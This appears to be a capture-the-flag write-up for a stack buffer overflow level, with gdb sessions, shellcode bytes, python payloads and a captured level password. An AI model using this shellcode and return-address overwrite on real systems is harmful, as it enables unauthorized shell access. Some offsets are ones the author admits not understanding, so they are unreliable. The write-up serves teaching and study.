## LEVEL 9
---
### Starting from now, you will find explanations in the disassembled file for each line in few upcoming levels. This will provide a better understanding of the payload and the solution.
---

This level is currently one of the most difficult levels I have encountered. Like level 9, I will explain the code to you using the C file and the disassembled file.

The first thing, as usual, is to find a potentially vulnerable function in the code.
```shell
(gdb) i func
[...]
0x08048390  strcat
0x08048390  strcat@plt
0x080483a0  strcpy
0x080483a0  strcpy@plt
[...]
0x080483f0  strncpy
0x080483f0  strncpy@plt
[...]
```
We can observe that there is the `strcpy` function, which is a potentially vulnerable function. There is also `strcat`, which is another potentially vulnerable function. Lastly, there is `strncpy`, a function that could be vulnerable in special cases. If you want to examine the code [here](./src/bonus0.c) is the file. In this README I will just explain the vulnerable functions.

Let's begin with the vulnerability related to `strcpy`. This is not the first time we encounter this function in order to complete a level. In brief, `strcpy` and `strcat` do not perform size checks during the copy or concatenation operations. Consequently, it is possible to easily overwrite memory beyond the intended boundaries.

The main issue to understand in the code is the usage of `strncpy`. According to the `man 3` documentation, if the `strncpy` function does not find the `\0` character within the first `n` bytes, it will not add it.
Therefore, if we use `strcpy` with a string that exceeds the size limited by `strncpy`, the resulting string will not have the `\0` character at the end.
In our case, whenever we use `strncpy` with `p`, we have the potential to alter the buffers of `pp` by removing the `\0` character at the end.

Now that we know what the function `p` does and how this function could be interresting for us.
It's time to do the same with the `pp` function.

Here is the most interresting part of the `pp` code:
```c
char			b[20];
char			a[20];

p(a, " - ");
p(b, " - ");
strcpy(str, a);
[...]
strcat(str, b);
```

Now that we understand how the `p` function can be used, let's consider the scenario where the first invocation of `p` removes the `\0` character at the end of the string `a`. In this case, when `strcpy` is called, it will not stop at the end of string `a` but will continue writing until it finds a `\0` character. Consequently, it will continue writing into the buffer `b`. 

Since the buffer in `main` is 42 bytes long, if we write 20 bytes into `a` and 20 bytes into `b`, followed by `strcat` writing `b` again into `str`, we will have a buffer overflow of the main buffer. This is advantageous for us because we can now modify the return address of the `main` function.

Now that we have identified the vulnerability in our program, we need to determine how to exploit it since we don't have any system calls in our code.

To overcome the absence of system calls in our code, we can employ the same technique as in level 9. We will overwrite the return address with the address of the `system` function and the address of the string "/bin/sh" in the stack. This will allow us to execute the `system` function with the argument "/bin/sh" and obtain a shell.

The last consideration we need to address is where to store the shellcode, given that strncpy limits the copy to 20 bytes but our shellcode is 21 bytes long.

To overcome this issue, we can use the 4096-byte buffer inside the `p` function to store it, because we know that the stack value isn't reset after each return. So between two calls, you keep the same values, but you just overwrite them.

Perfect ! Now we have all the information we need solve this level.

Let's begin by finding the length between the `main` buffer and the return value of `main`.
```shell
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -
AAAA
 -
AAAA

Breakpoint 1, 0x080485b9 in main ()
(gdb) x/x $esp+22
0xbffff706:	0x41414141
(gdb) x/a $ebp+4
0xbffff73c:	0xb7e454d3 <__libc_start_main+243>
```

The distance between the `main` buffer and the return value of `main` is 0x36 bytes that means 54 bytes.

Now we know that the first input must be equal to or greater than 20 bytes, and the second input must be (54 - 20) - 4  = 30 bytes.

Before proceeding further, we need to ensure that we can successfully overwrite the return address with a fake address.

```shell
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
AAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x080485b9 in main ()
(gdb) x/4x $ebp
0xbffff738:	0x41414141	0x41414141	0x00000041	0xbffff7d4
```
It seems that we have a problem, Why the bytes `A` are not aligned by 4 ?
Let's see the `main` buffer.
```shell
(gdb) x/32x $esp+22
0xbffff706:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff716:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff726:	0x41414141	0x20414141	0x41414141	0x41414141
0xbffff736:	0x41414141	0x41414141	0x00414141	0xf7d40000
0xbffff746:	0xf7dcbfff	0xc858bfff	0x0000b7fd	0xf71c0000
0xbffff756:	0xf7dcbfff	0x0000bfff	0x824c0000	0x0ff40804
0xbffff766:	0x0000b7fd	0x00000000	0x00000000	0xaa790000
0xbffff776:	0x0e69722e	0x00004569	0x00000000	0x00000000
```

As you can see we have the character `0x20` in the middle, this character misaligns the bytes `A` by 4. This is because in `pp` we have the following code:
```c
len = strlen(str);
str[len] = ' ';
```

To solve this problem our second input I will put the address at the center of the payload

```shell
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa

Breakpoint 2, 0x08048541 in pp ()
(gdb) n
Single stepping until exit from function pp,
which has no line number information.
 -
BBBBBBBBBCCCCBBBBBBBBBB

Breakpoint 3, 0x08048553 in pp ()
(gdb) x/4x $ebp
0xbffff738:	0x42424242	0x43434343	0x42424242	0xf4424242
```

Perfect the return address has been overwritten with the value `0x43434343`.

Now it's time to store the shellcode. We will store it in the 4096-byte buffer inside the `p` function, but we need to write it a few characters after the beginning of the buffer. This is because the first calls will store the shellcode, and the second calls must not overwrite our code.

```shell
(gdb) x/32x $esp
0xbfffe670:	0x00000000	0x0000000a	0x00001000	0x00000000
0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
```

We can see that the buffer is located at `0xbfffe680`. We will store the shellcode at `0xbfffe680 + 0x40 = 0xbfffe6c0`.

Perfect now we have everything we need to create the payload.

The first payload will be the following:
```shell
$ python -c 'print "\x90"*64 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' > /tmp/payload_part1
```

The second payload will be the following:
```shell
$ python -c 'print "\x90"*9 + "\xc0\xe6\xff\xbf" + "\x90"*7' > /tmp/payload_part2
```

Now we can execute the program with the following command:
```shell
$ (cat /tmp/payload_part1; cat /tmp/payload_part2; echo "cat /home/user/bonus/.pass") | ./bonus0
 -
 -
������������������������������������������ ����������������������
Segmentation fault (core dumped)
```

Oh no, it doesn't work. It seems that the shellcode is not being executed. However, strangely enough, the exploit works when I execute `payload_part2` with `\xc8\xe6\xff\xbf`. After conducting several hours of research and using GDB, I still haven't been able to understand why it works with `\xc8\xe6\xff\xbf` and not with `\xc0\xe6\xff\xbf`. Even though I have obtained the password, I want to use a method that I understand. Therefore, I will explore another approach that I have discovered.

In this second technique, I will store the shellcode inside environment variables. The shellcode will be stored in the environment variable `SHELLCODE`.

```shell
export SHELLCODE=$(python -c 'print "\x90"*64 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

Now I search the address of `SHELLCODE` in the stack with GDB.

```shell
(gdb) x/s *((char **)environ) 
0xbffff8a9:	 "SHELLCODE=\220\220\220\220[...]
```

Then, I change the address inside `payload_part2` with the address of `SHELLCODE` in the stack plus 10 to remove the variable name.

Additionally, we need to add 5 bytes to the address, although the exact reason for this is still unknown to me. I suspect that it is because the shellcode is stored in the environment variable `SHELLCODE` and not on the stack. The shellcode requires some space on the stack to push certain information in order to function correctly. If you happen to know the reason behind this, please contact me as I would love to understand it.

```shell
$ python -c 'print "\x90"*9 + "\xb8\xf8\xff\xbf" + "\x90"*7' > /tmp/payload
$ (cat /tmp/payload; cat /tmp/payload; cat) | ./bonus0
 -
 -
������������������������������������������ ����������������������
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

---

*Source :*

*https://www.labri.fr/perso/fleury/posts/security/payload-injection.html*

*https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow*



